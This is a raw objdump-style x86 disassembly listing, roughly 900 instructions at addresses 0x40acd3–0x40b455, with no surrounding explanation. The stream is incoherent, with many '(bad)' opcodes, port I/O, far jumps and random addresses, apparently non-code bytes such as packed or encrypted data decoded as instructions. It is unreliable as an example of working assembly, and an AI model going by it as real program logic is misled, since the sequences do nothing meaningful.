  40acd3:	ss enter 0x2fa6,0x8
  40acd8:	sub    eax,0x67ffefd
  40acdd:	jg     0x40ad55
  40acdf:	sub    ebp,DWORD PTR [edi]
  40ace1:	fs xchg esi,eax
  40ace3:	jns    0x40ad2f
  40ace5:	in     al,dx
  40ace6:	mov    ebp,0x71740459
  40aceb:	cmp    esi,DWORD PTR [esi]
  40aced:	retf   
  40acee:	push   ebx
  40acef:	sbb    eax,0x8fe1bc62
  40acf4:	leave  
  40acf5:	loop   0x40ad20
  40acf7:	repz jg 0x40ac96
  40acfa:	(bad)  
  40acfb:	loope  0x40acd7
  40acfd:	and    al,BYTE PTR [ebx]
  40acff:	sbb    al,0x23
  40ad01:	adc    al,0x98
  40ad03:	sbb    DWORD PTR [edi],ecx
  40ad05:	jmp    0x40ac8a
  40ad07:	aas    
  40ad08:	jmp    0xe2b72814
  40ad0d:	fsub   st(2),st
  40ad0f:	aaa    
  40ad10:	sbb    BYTE PTR [esi-0x6aea5301],al
  40ad16:	mov    dl,0x7b
  40ad18:	out    0xb8,eax
  40ad1a:	xchg   ecx,eax
  40ad1b:	cmp    eax,ebp
  40ad1d:	sbb    eax,DWORD PTR [edi]
  40ad1f:	test   cl,bl
  40ad21:	xchg   edi,eax
  40ad22:	fwait
  40ad23:	inc    ebx
  40ad24:	and    BYTE PTR [ecx],bh
  40ad26:	mov    bh,0xf9
  40ad28:	sar    DWORD PTR [esi],0xd3
  40ad2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ad2c:	int3   
  40ad2d:	xchg   edx,eax
  40ad2e:	xchg   edx,eax
  40ad2f:	and    DWORD PTR [ecx+0x6e55450c],edx
  40ad35:	mov    dl,0x74
  40ad37:	cwde   
  40ad38:	ret    
  40ad39:	adc    bh,BYTE PTR [edx+ecx*4-0x1a]
  40ad3d:	repz mov eax,ds:0x6538726c
  40ad43:	ret    
  40ad44:	pop    edi
  40ad45:	test   eax,0xdcd3394c
  40ad4a:	(bad)  
  40ad4b:	ins    DWORD PTR es:[edi],dx
  40ad4c:	inc    edi
  40ad4d:	jnp    0x40ad48
  40ad4f:	sbb    DWORD PTR [edx+0x79338adb],ebp
  40ad55:	sbb    eax,DWORD PTR [ebp+0x58]
  40ad58:	aaa    
  40ad59:	ja     0x40ad0c
  40ad5b:	mov    DWORD PTR [ecx],ebx
  40ad5d:	std    
  40ad5e:	ja     0x40ad39
  40ad60:	int3   
  40ad61:	pop    ebp
  40ad62:	outs   dx,BYTE PTR ds:[esi]
  40ad63:	stos   BYTE PTR es:[edi],al
  40ad64:	into   
  40ad65:	sti    
  40ad66:	scas   al,BYTE PTR es:[edi]
  40ad67:	rol    DWORD PTR [eax],0x49
  40ad6a:	add    ebx,DWORD PTR [eax]
  40ad6c:	sbb    DWORD PTR [eax],0x19
  40ad6f:	inc    eax
  40ad70:	call   0xec9fca18
  40ad75:	stos   BYTE PTR es:[edi],al
  40ad76:	mov    WORD PTR [ebx+0x498a677f],es
  40ad7c:	outs   dx,BYTE PTR ds:[esi]
  40ad7d:	adc    eax,0xb9344592
  40ad82:	aad    0x34
  40ad84:	fs dec ebp
  40ad86:	pop    ss
  40ad87:	jmp    0x99979125
  40ad8c:	fcomp  QWORD PTR [ebp+0x7ab5b62c]
  40ad92:	add    dh,al
  40ad94:	add    ecx,DWORD PTR [ebp-0x1cc9c9fb]
  40ad9a:	mov    esp,gs
  40ad9c:	cld    
  40ad9d:	imul   edx
  40ad9f:	iret   
  40ada0:	ret    0x3a9b
  40ada3:	jbe    0x40ad94
  40ada5:	adc    cl,BYTE PTR [edi+edi*1-0xb]
  40ada9:	sbb    eax,edx
  40adab:	inc    BYTE PTR [ecx]
  40adad:	adc    cl,0xf6
  40adb0:	add    DWORD PTR [eax-0x10],esi
  40adb3:	sbb    bl,BYTE PTR [edx+0x74cca53e]
  40adb9:	inc    esi
  40adba:	es stos BYTE PTR es:[edi],al
  40adbc:	jbe    0x40adff
  40adbe:	jnp    0x40ae32
  40adc0:	ret    0xcc27
  40adc3:	xor    DWORD PTR [ebx-0x1c22d684],esp
  40adc9:	jmp    0x40adce
  40adcb:	jae    0x40ae41
  40adcd:	fistp  QWORD PTR [edx-0x1b]
  40add0:	fcomp  QWORD PTR [ecx+0x5aa938fe]
  40add6:	sahf   
  40add7:	inc    esp
  40add8:	lahf   
  40add9:	inc    ebp
  40adda:	lods   al,BYTE PTR ds:[esi]
  40addb:	pop    ds
  40addc:	ret    0x8c4c
  40addf:	mov    cs,ecx
  40ade1:	retf   
  40ade2:	push   edi
  40ade3:	or     BYTE PTR [edi+0x39],0xb5
  40ade7:	push   edi
  40ade8:	jns    0x40ade1
  40adea:	push   ds
  40adeb:	dec    esi
  40adec:	ror    BYTE PTR [ecx-0x49],cl
  40adef:	add    BYTE PTR [ebx-0x5d],ah
  40adf2:	sub    esi,DWORD PTR [ebp-0x27]
  40adf5:	dec    edx
  40adf6:	and    BYTE PTR [edx-0x4480d1c3],0xff
  40adfd:	mov    ecx,0xf2c40ef0
  40ae02:	xchg   ebp,eax
  40ae03:	adc    eax,0x5e8a3a65
  40ae08:	xchg   edx,eax
  40ae09:	out    0x84,al
  40ae0b:	mov    bl,0xa7
  40ae0d:	xlat   BYTE PTR ds:[ebx]
  40ae0e:	inc    ebp
  40ae0f:	(bad)  
  40ae10:	bswap  eax
  40ae12:	xor    al,0xdf
  40ae14:	pop    es
  40ae15:	adc    BYTE PTR [edi-0x14],0x4d
  40ae19:	and    BYTE PTR [ebx*4-0x622f7656],bl
  40ae20:	lock jne 0x40adc6
  40ae23:	outs   dx,BYTE PTR ds:[esi]
  40ae24:	scas   eax,DWORD PTR es:[edi]
  40ae25:	dec    edx
  40ae26:	daa    
  40ae27:	mov    edx,0x7fde3528
  40ae2c:	adc    bl,BYTE PTR [ebx]
  40ae2e:	mov    WORD PTR [ebx],gs
  40ae30:	inc    ebp
  40ae31:	mov    eax,0xafdab991
  40ae36:	test   BYTE PTR [esi+0x22da06a8],dh
  40ae3c:	jl     0x40ae7e
  40ae3e:	aas    
  40ae3f:	jno    0x40adc5
  40ae41:	inc    ecx
  40ae42:	(bad)  
  40ae43:	fucomip st,st(4)
  40ae45:	jmp    0x40aec3
  40ae47:	popf   
  40ae48:	xor    BYTE PTR [eax+0x366dbf2f],ah
  40ae4e:	or     BYTE PTR [ebp+0x1e],dl
  40ae51:	mov    esi,ss
  40ae53:	or     eax,0xc667421d
  40ae58:	stos   DWORD PTR es:[edi],eax
  40ae59:	cdq    
  40ae5a:	aas    
  40ae5b:	push   ss
  40ae5c:	mov    esp,DWORD PTR [edx+0x22571769]
  40ae62:	cmp    eax,0xd3e54daf
  40ae67:	and    BYTE PTR [ebx+edi*2],bh
  40ae6a:	dec    ebp
  40ae6b:	and    dl,0xc7
  40ae6e:	xlat   BYTE PTR ds:[ebx]
  40ae6f:	xchg   esi,eax
  40ae70:	jl     0x40ae9e
  40ae72:	mov    al,0xfb
  40ae74:	jne    0x40ae73
  40ae76:	sbb    al,0x70
  40ae78:	retf   
  40ae79:	xchg   edx,eax
  40ae7a:	sub    edx,esi
  40ae7c:	add    al,0x8f
  40ae7e:	mov    bl,BYTE PTR [edi-0x1d]
  40ae81:	dec    edi
  40ae82:	pusha  
  40ae83:	adc    cl,bh
  40ae85:	retf   0x768
  40ae88:	fisttp WORD PTR ss:0xfade699c
  40ae8f:	repz out 0xe2,eax
  40ae92:	xchg   esi,eax
  40ae93:	sub    ebx,DWORD PTR [ecx]
  40ae95:	xor    eax,0x4417defa
  40ae9a:	cmp    DWORD PTR [esi+0x38],ebp
  40ae9d:	jp     0x40aee2
  40ae9f:	sub    DWORD PTR ds:[edi],ebx
  40aea2:	mov    ch,0x7f
  40aea4:	mov    DWORD PTR [eax-0x16],edx
  40aea7:	dec    ebx
  40aea8:	xor    BYTE PTR [esi],ch
  40aeaa:	cmp    eax,0xe60c3ed9
  40aeaf:	ja     0x40aed6
  40aeb1:	fisttp WORD PTR [esi+ebx*8+0x77]
  40aeb5:	mov    bh,0xed
  40aeb7:	mov    ah,0x7a
  40aeb9:	xor    ebx,DWORD PTR [ebx]
  40aebb:	or     eax,0x4844b2b7
  40aec0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aec1:	xor    ebx,DWORD PTR [ecx+ebx*8-0x700d93e4]
  40aec8:	nop
  40aec9:	dec    ebx
  40aeca:	shr    BYTE PTR [esi+0x68cfd174],1
  40aed0:	or     eax,0x414e3fe0
  40aed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aed6:	xchg   esp,eax
  40aed7:	sar    BYTE PTR [esi],cl
  40aed9:	cmp    cl,cl
  40aedb:	inc    esi
  40aedc:	out    0x13,al
  40aede:	push   ds
  40aedf:	cmp    BYTE PTR [esi-0x52],bl
  40aee2:	sbb    ch,dl
  40aee4:	dec    ebp
  40aee5:	pop    es
  40aee6:	pop    ss
  40aee7:	pmullw mm7,mm6
  40aeea:	mov    ch,0xa8
  40aeec:	out    0x4a,al
  40aeee:	out    0x96,al
  40aef0:	dec    edi
  40aef1:	cmc    
  40aef2:	fiadd  DWORD PTR [edx+0x30]
  40aef5:	icebp  
  40aef6:	sahf   
  40aef7:	rcr    BYTE PTR [ecx-0x31ab79e2],1
  40aefd:	shl    DWORD PTR [edi],0xda
  40af00:	push   esp
  40af01:	sub    al,BYTE PTR [edi]
  40af03:	sub    al,0xb8
  40af05:	out    dx,eax
  40af06:	mov    ds:0xca21ee32,eax
  40af0b:	jo     0x40af83
  40af0d:	dec    eax
  40af0e:	xor    al,0x19
  40af10:	sbb    DWORD PTR [esi-0x54],ebx
  40af13:	ins    DWORD PTR es:[edi],dx
  40af14:	dec    ebp
  40af15:	ds icebp 
  40af17:	repnz dec ebx
  40af19:	jecxz  0x40ae9b
  40af1b:	std    
  40af1c:	test   al,0x23
  40af1e:	xchg   edi,eax
  40af1f:	sahf   
  40af20:	lds    eax,FWORD PTR [eax+esi*8-0x7807ea75]
  40af27:	add    ebx,DWORD PTR [ebp+edi*1+0x49de818]
  40af2e:	inc    ecx
  40af2f:	xchg   DWORD PTR [ebp-0x426e6601],ecx
  40af35:	cwde   
  40af36:	pop    ss
  40af37:	push   ss
  40af38:	mov    ebx,0x6f7a63ea
  40af3d:	ss cwde 
  40af3f:	mov    ds:0xe9cfc282,al
  40af44:	push   ebx
  40af45:	mov    fs,WORD PTR [edx-0x28366eee]
  40af4b:	test   eax,0x7be3f9d1
  40af50:	push   eax
  40af51:	aad    0xad
  40af53:	mov    es,eax
  40af55:	or     eax,0xb4ce4185
  40af5a:	mov    ch,0x7d
  40af5c:	aaa    
  40af5d:	add    eax,0xcda0cdc5
  40af62:	sub    bh,BYTE PTR fs:[ecx+esi*4-0x50497a3a]
  40af6a:	push   edx
  40af6b:	js     0x40af35
  40af6d:	cmp    esp,eax
  40af6f:	mov    cl,0xe5
  40af71:	inc    ebp
  40af72:	ins    BYTE PTR es:[edi],dx
  40af73:	cs xchg esi,eax
  40af75:	clc    
  40af76:	shl    DWORD PTR [eax+0x115fa46e],cl
  40af7c:	arpl   di,sp
  40af7e:	or     al,0x61
  40af80:	arpl   WORD PTR [esi-0x68324403],dx
  40af86:	jge    0x40af81
  40af88:	test   DWORD PTR [edi-0x109dfdf3],0x3db79734
  40af92:	mov    ch,0x47
  40af94:	jle    0x40af31
  40af96:	cmp    DWORD PTR [edi],ecx
  40af98:	sbb    BYTE PTR [edi+0x60],cl
  40af9b:	pushf  
  40af9c:	sti    
  40af9d:	out    dx,eax
  40af9e:	mov    bl,0xa2
  40afa0:	or     BYTE PTR [edi-0x3cd62665],dh
  40afa6:	jno    0x40afeb
  40afa8:	les    edx,FWORD PTR [edi-0x6db8b69e]
  40afae:	xchg   DWORD PTR [ecx-0xadd172],esp
  40afb4:	mov    esi,0xdad21fc6
  40afb9:	aaa    
  40afba:	sub    DWORD PTR [ecx-0x53],eax
  40afbd:	rol    al,0xd7
  40afc0:	arpl   bp,di
  40afc2:	(bad)  
  40afc3:	(bad)  
  40afc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40afc5:	shr    esp,1
  40afc7:	push   ebp
  40afc8:	inc    ebp
  40afc9:	fld    QWORD PTR [edx]
  40afcb:	daa    
  40afcc:	cli    
  40afcd:	inc    ebx
  40afce:	je     0x40afbf
  40afd0:	inc    ebx
  40afd1:	mov    ecx,0x263da56b
  40afd6:	sbb    eax,DWORD PTR [edi-0x1e]
  40afd9:	mov    ds:0x78854937,eax
  40afde:	(bad)  
  40afdf:	mov    DWORD PTR [ebx-0x1780524b],0xa8410456
  40afe9:	dec    esi
  40afea:	xchg   BYTE PTR [eax+0x7b],ah
  40afed:	cmp    al,0x28
  40afef:	xchg   ebx,ebp
  40aff1:	pop    eax
  40aff2:	dec    ebx
  40aff3:	rcl    DWORD PTR [eax],0xfb
  40aff6:	adc    eax,0x118810d5
  40affb:	lahf   
  40affc:	sbb    al,0xb9
  40affe:	jnp    0x40afb8
  40b000:	test   DWORD PTR [esi-0x5209abf5],eax
  40b006:	push   si
  40b008:	out    dx,eax
  40b009:	call   0x160bb4e1
  40b00e:	pushf  
  40b00f:	(bad)  
  40b010:	loope  0x40b06b
  40b012:	mov    dl,0xf1
  40b014:	push   ebp
  40b015:	lea    ebp,gs:[ebx]
  40b018:	sbb    DWORD PTR [eax+esi*4-0x1f],esp
  40b01c:	in     eax,0x8a
  40b01e:	shl    edx,1
  40b020:	(bad)  
  40b022:	jg     0x40b03c
  40b024:	stc    
  40b025:	jno    0x40b046
  40b027:	out    dx,al
  40b028:	retf   0x324a
  40b02b:	in     al,0xd6
  40b02d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b02e:	enter  0x9eef,0xbc
  40b032:	mov    dl,0xbb
  40b034:	scas   al,BYTE PTR es:[edi]
  40b035:	inc    ecx
  40b036:	and    eax,0x4e79b863
  40b03b:	jmp    0x40b0bb
  40b03d:	xchg   edx,eax
  40b03e:	xchg   ebx,eax
  40b03f:	fcmovnu st,st(2)
  40b041:	rol    DWORD PTR [ecx-0x5a2f1d51],0xc9
  40b048:	add    al,0xb3
  40b04a:	adc    al,0xc
  40b04c:	(bad)  
  40b04d:	push   ebp
  40b04e:	ret    
  40b04f:	jecxz  0x40b002
  40b051:	inc    ecx
  40b052:	cwde   
  40b053:	sub    bl,BYTE PTR [ebx+0x24]
  40b056:	xor    al,0xd6
  40b058:	lahf   
  40b059:	imul   eax,DWORD PTR [edi],0x2488055f
  40b05f:	ret    0x3074
  40b062:	xor    ch,BYTE PTR [eax+0x26]
  40b065:	aad    0xc7
  40b067:	jecxz  0x40b09f
  40b069:	out    dx,al
  40b06a:	add    eax,0x2bc5fa77
  40b06f:	sub    dh,BYTE PTR [ebp-0x698ef595]
  40b075:	xchg   BYTE PTR [ebp-0x52],cl
  40b078:	jp     0x40b0c9
  40b07a:	adc    eax,0xaccc12c4
  40b07f:	add    eax,DWORD PTR [edx]
  40b081:	push   edi
  40b082:	int3   
  40b083:	add    eax,DWORD PTR [eax]
  40b085:	retf   
  40b086:	push   ds
  40b087:	jl     0x40b0ad
  40b089:	mov    ds:0xe359840,eax
  40b08e:	mov    esi,0x88ba9f46
  40b093:	push   esi
  40b094:	rol    DWORD PTR [esp+edx*8-0x68957917],1
  40b09b:	push   esi
  40b09c:	push   es
  40b09d:	push   0x48
  40b09f:	sbb    al,BYTE PTR [esp+ecx*8+0x6e761f74]
  40b0a6:	mov    dh,0xff
  40b0a8:	stos   DWORD PTR es:[edi],eax
  40b0a9:	push   ss
  40b0aa:	mov    eax,ds:0xe2ee50a7
  40b0af:	rcl    DWORD PTR [esi-0x71],0x1a
  40b0b3:	push   es
  40b0b4:	push   ecx
  40b0b5:	cmp    eax,0x98904af1
  40b0ba:	xchg   ebp,eax
  40b0bb:	inc    esi
  40b0bc:	es xor eax,0xd8f91037
  40b0c2:	call   0x2efc4d29
  40b0c7:	sub    BYTE PTR [edi-0x1ab433d2],cl
  40b0cd:	sbb    al,0x27
  40b0cf:	and    BYTE PTR [esi+0x78ea99a3],dl
  40b0d5:	sbb    eax,0x1631eea3
  40b0da:	jg     0x40b0c0
  40b0dc:	mov    DWORD PTR [edx+0x95e45b3],ebx
  40b0e2:	out    dx,eax
  40b0e3:	sub    eax,0x5ec2499c
  40b0e8:	imul   esp,DWORD PTR [ebp+0x3a],0x8f0b3173
  40b0ef:	mov    bl,bh
  40b0f1:	(bad)  
  40b0f2:	push   eax
  40b0f3:	retf   0xde96
  40b0f6:	xchg   edx,eax
  40b0f7:	mov    ebp,0x899af1f7
  40b0fc:	mov    WORD PTR [ebp-0x185a7cf3],?
  40b102:	xchg   ebx,eax
  40b103:	fcomp  DWORD PTR [ebx+0x40]
  40b106:	push   ss
  40b107:	dec    ecx
  40b108:	xchg   ebx,eax
  40b109:	mov    dh,0x0
  40b10b:	pop    ebx
  40b10c:	fs shl ebp,0x9f
  40b110:	sub    DWORD PTR [esp+ecx*2+0x45],ebx
  40b114:	add    bl,bh
  40b116:	out    0xd6,eax
  40b118:	jbe    0x40b0a8
  40b11a:	xor    DWORD PTR [ecx-0x7b62f85f],edi
  40b120:	mov    al,ds:0xad4a55d1
  40b125:	aaa    
  40b126:	lds    esi,FWORD PTR [edx-0x2f]
  40b129:	mov    WORD PTR [ebx+0x34],gs
  40b12c:	ret    
  40b12d:	push   0x12
  40b12f:	mov    WORD PTR [ecx],ds
  40b131:	dec    esi
  40b132:	xchg   ebx,eax
  40b133:	in     eax,0xf8
  40b135:	lds    edi,FWORD PTR [eax]
  40b137:	test   DWORD PTR [ebp-0xe92697c],esp
  40b13d:	pusha  
  40b13e:	xor    BYTE PTR [ebx+0x2efe1a45],al
  40b144:	ror    edx,1
  40b146:	mov    eax,ds:0x65fe1c6a
  40b14b:	jmp    0x40b14c
  40b14d:	and    eax,0x6909843
  40b152:	pop    ebp
  40b153:	push   ebx
  40b154:	push   edx
  40b155:	popf   
  40b156:	mov    BYTE PTR [eax],dh
  40b158:	test   DWORD PTR [ebx+0x44b480d6],ebx
  40b15e:	(bad)  
  40b15f:	out    0x4a,eax
  40b161:	scas   eax,DWORD PTR es:[edi]
  40b162:	es inc edi
  40b164:	jp     0x40b17f
  40b166:	inc    eax
  40b167:	call   0x9717ca08
  40b16c:	mov    eax,0xad5b3178
  40b171:	fsub   DWORD PTR [edx]
  40b173:	mov    WORD PTR [edi],ss
  40b175:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b176:	(bad)  
  40b177:	stos   DWORD PTR es:[edi],eax
  40b178:	jno    0x40b0ff
  40b17a:	xor    eax,ecx
  40b17c:	jp     0x40b18c
  40b17e:	jmp    0xe4d2edba
  40b183:	xlat   BYTE PTR ds:[ebx]
  40b184:	in     al,0xe1
  40b186:	mov    DWORD PTR [eax],edi
  40b188:	mov    es,WORD PTR [ecx-0x5f]
  40b18b:	pusha  
  40b18c:	mov    eax,0xe28171f0
  40b191:	pop    esp
  40b192:	dec    edi
  40b193:	les    edi,FWORD PTR [ebp+0x5ff97275]
  40b199:	shr    edi,0x9d
  40b19c:	jae    0x40b1f5
  40b19e:	cmp    BYTE PTR [ebx+ecx*4-0x3efaa4b9],0x2a
  40b1a6:	rcr    DWORD PTR [ebx+ebp*8-0x29],cl
  40b1aa:	rcr    BYTE PTR [edi-0x6796a2a9],cl
  40b1b0:	add    al,BYTE PTR [esi-0x45]
  40b1b3:	arpl   di,sp
  40b1b5:	add    eax,0x54ce4d27
  40b1ba:	enter  0x4414,0x66
  40b1be:	xor    DWORD PTR [eax],edi
  40b1c0:	xchg   ebp,eax
  40b1c1:	hlt    
  40b1c2:	adc    dh,BYTE PTR [edx-0x25]
  40b1c5:	xchg   DWORD PTR [ebx],ebp
  40b1c7:	mov    eax,ds:0x85a537a6
  40b1cc:	cmp    eax,0xfed7b3c5
  40b1d1:	mov    eax,ds:0x6ee11556
  40b1d6:	into   
  40b1d7:	mov    ds:0xfc025f54,al
  40b1dc:	jl     0x40b208
  40b1de:	xchg   edx,eax
  40b1df:	mov    dh,0x94
  40b1e1:	adc    BYTE PTR [ebx],0x17
  40b1e4:	or     al,0x98
  40b1e6:	and    al,0xc
  40b1e8:	dec    edi
  40b1e9:	xorps  xmm3,XMMWORD PTR [ecx]
  40b1ec:	push   es
  40b1ed:	inc    eax
  40b1ee:	mov    ss,WORD PTR [esi]
  40b1f0:	arpl   WORD PTR [bp+si+0x51c],si
  40b1f5:	call   0xe119d46e
  40b1fa:	mov    al,0x44
  40b1fc:	xor    al,0xee
  40b1fe:	dec    edx
  40b1ff:	outs   dx,DWORD PTR ds:[esi]
  40b200:	stos   DWORD PTR es:[edi],eax
  40b201:	push   eax
  40b202:	adc    ebp,DWORD PTR [eax+0x27]
  40b205:	cs sbb BYTE PTR gs:[ebx+0x3d750912],dl
  40b20d:	loope  0x40b244
  40b20f:	scas   al,BYTE PTR es:[edi]
  40b210:	jbe    0x40b278
  40b212:	add    BYTE PTR [edi+0x53b842a6],bh
  40b218:	xchg   ecx,eax
  40b219:	in     eax,dx
  40b21a:	sbb    bh,BYTE PTR [eax+0x7d]
  40b21d:	out    0xea,eax
  40b21f:	pop    ebp
  40b220:	sbb    al,0xa6
  40b222:	outs   dx,DWORD PTR ds:[esi]
  40b223:	pop    es
  40b224:	js     0x40b21e
  40b226:	jmp    0xc566:0x598971e5
  40b22d:	loopne 0x40b21b
  40b22f:	imul   ecx,edi,0x2757b73c
  40b235:	push   ss
  40b236:	pop    esi
  40b237:	xor    DWORD PTR [ebx-0x53c8a0bf],edx
  40b23d:	sbb    esp,DWORD PTR [ebx]
  40b23f:	mov    ds:0xfc84ae82,eax
  40b244:	push   eax
  40b245:	(bad)  
  40b246:	aad    0xe5
  40b248:	mov    bl,0x18
  40b24a:	mov    ds,WORD PTR [ebx+0x5c5a6f14]
  40b250:	mov    edx,0x1bb63363
  40b255:	(bad)  [ecx-0x19e7c326]
  40b25b:	mov    eax,ds:0x625cffc2
  40b260:	pop    ebx
  40b261:	imul   esp,DWORD PTR [eax-0xa],0x2d
  40b265:	pop    es
  40b266:	xchg   ebp,eax
  40b267:	add    cl,BYTE PTR [esi-0x15]
  40b26a:	clc    
  40b26b:	imul   edi,DWORD PTR [eax+0x51f65cf9],0xffffff84
  40b272:	xor    DWORD PTR ss:[esi+0x47a74d9b],ebp
  40b279:	lds    esp,FWORD PTR [edi-0xb8ec794]
  40b27f:	mov    gs,WORD PTR [edi+eiz*2]
  40b282:	outs   dx,DWORD PTR ds:[esi]
  40b283:	retf   
  40b284:	stos   DWORD PTR es:[edi],eax
  40b285:	mov    DWORD PTR [ecx+0x34],esi
  40b288:	mov    WORD PTR [esi-0x30],fs
  40b28b:	cmp    ecx,esp
  40b28d:	nop
  40b28e:	mov    al,ds:0x5159a0ab
  40b293:	or     eax,0x5a9c7d48
  40b298:	or     ecx,DWORD PTR [ebx+ecx*1]
  40b29b:	push   0x161d5156
  40b2a0:	out    0x92,eax
  40b2a2:	rcr    esp,0xfa
  40b2a5:	lahf   
  40b2a6:	push   ecx
  40b2a7:	aaa    
  40b2a8:	outs   dx,BYTE PTR ds:[esi]
  40b2a9:	out    dx,al
  40b2aa:	cdq    
  40b2ab:	test   DWORD PTR ds:0xc6b28e71,ebx
  40b2b1:	xchg   ecx,eax
  40b2b2:	sbb    bh,dh
  40b2b4:	cli    
  40b2b5:	dec    esi
  40b2b6:	aam    0x52
  40b2b8:	adc    ch,cl
  40b2ba:	inc    eax
  40b2bb:	cmp    eax,0xd469443d
  40b2c0:	call   0x27a1:0x5c2e05aa
  40b2c7:	mov    ds:0x697a57a2,eax
  40b2cc:	retf   
  40b2cd:	xchg   ebp,eax
  40b2ce:	aas    
  40b2cf:	inc    ebp
  40b2d0:	add    eax,0xb4ac5042
  40b2d5:	and    eax,0x91fc0cea
  40b2da:	(bad)  
  40b2db:	jns    0x40b31e
  40b2dd:	dec    ebp
  40b2de:	scas   al,BYTE PTR es:[edi]
  40b2df:	repz cmp DWORD PTR [ecx+0xf888b27],0x4f
  40b2e7:	mov    edi,0x8d71e61f
  40b2ec:	ret    
  40b2ed:	cmp    DWORD PTR [ecx-0x1c8795d9],esp
  40b2f3:	rcl    DWORD PTR [bp+di-0x3],cl
  40b2f7:	shl    ebx,cl
  40b2f9:	test   eax,0x357b7360
  40b2fe:	fcomp  QWORD PTR [edx+eax*8-0x59e35d06]
  40b305:	mov    esi,0xca621867
  40b30a:	or     al,0x4c
  40b30c:	les    ebx,FWORD PTR [ecx+0x46]
  40b30f:	and    esp,ebx
  40b311:	push   ecx
  40b312:	dec    ecx
  40b313:	retf   0x5be2
  40b316:	cs shl bh,1
  40b319:	dec    esi
  40b31a:	mov    esp,DWORD PTR [edi+0x7e20b]
  40b320:	jg     0x40b399
  40b322:	or     al,0x13
  40b324:	mov    al,0x5d
  40b326:	dec    ebp
  40b327:	fisub  WORD PTR [ebp-0x1a65340a]
  40b32d:	push   ebp
  40b32e:	call   0x6f08:0x6bf8a042
  40b335:	push   es
  40b336:	sar    ebp,cl
  40b338:	push   ds
  40b339:	imul   edx,DWORD PTR [ebx-0x5],0x72
  40b33d:	and    eax,0xd536648e
  40b342:	push   eax
  40b343:	and    eax,0xe1ef4777
  40b348:	xor    BYTE PTR [ebx],bl
  40b34a:	sub    bl,ch
  40b34c:	pop    edi
  40b34d:	aaa    
  40b34e:	popa   
  40b34f:	mov    bh,0x13
  40b351:	in     al,0x53
  40b353:	lods   eax,DWORD PTR ds:[esi]
  40b354:	mov    DWORD PTR [ecx],edx
  40b356:	or     eax,0xfdf7c2fa
  40b35b:	xor    BYTE PTR [eax],bl
  40b35d:	call   0x41dc:0x1216f587
  40b364:	ss in  al,0xa4
  40b367:	sbb    edx,DWORD PTR [edx-0x3f08c5ac]
  40b36d:	ins    BYTE PTR es:[edi],dx
  40b36e:	shr    dl,0x51
  40b371:	push   esi
  40b372:	iret   
  40b373:	rcr    DWORD PTR [eax],1
  40b375:	cdq    
  40b376:	test   eax,0x532e2e39
  40b37b:	retf   0x1939
  40b37e:	scas   eax,DWORD PTR es:[edi]
  40b37f:	loop   0x40b36c
  40b381:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b382:	out    0xda,al
  40b384:	xchg   edx,eax
  40b385:	and    DWORD PTR [edx+0xb],ebp
  40b388:	test   ecx,ebp
  40b38a:	push   es
  40b38b:	nop
  40b38c:	loope  0x40b392
  40b38e:	add    eax,0x4b323d64
  40b393:	sahf   
  40b394:	cmp    eax,0x7319588b
  40b399:	std    
  40b39a:	xchg   DWORD PTR [edi+0x37f34e27],edx
  40b3a0:	sub    BYTE PTR [ebp+0x3d],bh
  40b3a3:	inc    esp
  40b3a4:	imul   ebp,DWORD PTR [esi+0x18bf1496],0xffffffd9
  40b3ab:	(bad)  
  40b3ac:	mov    fs,WORD PTR [ebx-0x12]
  40b3af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b0:	addps  xmm3,XMMWORD PTR [edi]
  40b3b3:	adc    DWORD PTR [ebp+0x183191c1],0xa5e26dc0
  40b3bd:	repz jle 0x40b360
  40b3c0:	cmpxchg bl,dl
  40b3c3:	(bad)  
  40b3c4:	loop   0x40b3fa
  40b3c6:	sub    esp,DWORD PTR [esi]
  40b3c8:	mov    eax,ds:0xc88bcf5d
  40b3cd:	adc    eax,0x8997f064
  40b3d2:	sub    al,0x29
  40b3d4:	inc    cl
  40b3d6:	adc    bh,BYTE PTR [ebp+0x68]
  40b3d9:	pop    edx
  40b3da:	sar    DWORD PTR [ebx-0x72],cl
  40b3dd:	cs pop ebx
  40b3df:	repnz push esp
  40b3e1:	xchg   esp,eax
  40b3e2:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b3e4:	std    
  40b3e5:	inc    eax
  40b3e6:	scas   al,BYTE PTR es:[edi]
  40b3e7:	les    ebx,FWORD PTR [edi]
  40b3e9:	inc    ecx
  40b3ea:	dec    ecx
  40b3eb:	or     BYTE PTR [edx],ch
  40b3ed:	push   0xffffffba
  40b3ef:	rcr    dh,1
  40b3f1:	lods   eax,DWORD PTR ds:[esi]
  40b3f2:	xor    esp,eax
  40b3f4:	xchg   esi,eax
  40b3f5:	fcomp  st(0)
  40b3f7:	fadd   DWORD PTR [esi]
  40b3f9:	mov    dh,0xed
  40b3fb:	inc    edx
  40b3fc:	adc    al,0xc4
  40b3fe:	xchg   esp,eax
  40b3ff:	pop    eax
  40b400:	push   0x35
  40b402:	push   ds
  40b403:	ss int 0xbd
  40b406:	arpl   WORD PTR [edx+edi*8],ax
  40b409:	or     BYTE PTR [ebx+0x15d8819a],bl
  40b40f:	jmp    0xbfd4:0xd7624812
  40b416:	mov    edi,0x3b17552
  40b41b:	xchg   ebp,eax
  40b41c:	jg     0x40b3a2
  40b41e:	je     0x40b3f3
  40b420:	mov    al,ds:0x24ab66e8
  40b425:	mov    ah,0x8a
  40b427:	mov    ebp,DWORD PTR [eax-0x29]
  40b42a:	cwde   
  40b42b:	mov    cl,0x99
  40b42e:	jmp    0x40b48e
  40b430:	xchg   edi,eax
  40b431:	shr    BYTE PTR [ecx],cl
  40b433:	hlt    
  40b434:	jle    0x40b3e8
  40b436:	jmp    0x36ac67d4
  40b43b:	repnz neg DWORD PTR [ebx]
  40b43e:	cmp    al,0xb2
  40b440:	sub    eax,0x58715902
  40b445:	enter  0xe70e,0x72
  40b449:	add    ecx,DWORD PTR [edi+0x50]
  40b44c:	xrelease xchg BYTE PTR [edi+0x6e],al
  40b450:	jg     0x40b403
  40b452:	aas    
  40b453:	add    al,0xcf
  40b455:	fisub  DWORD PTR [edi]
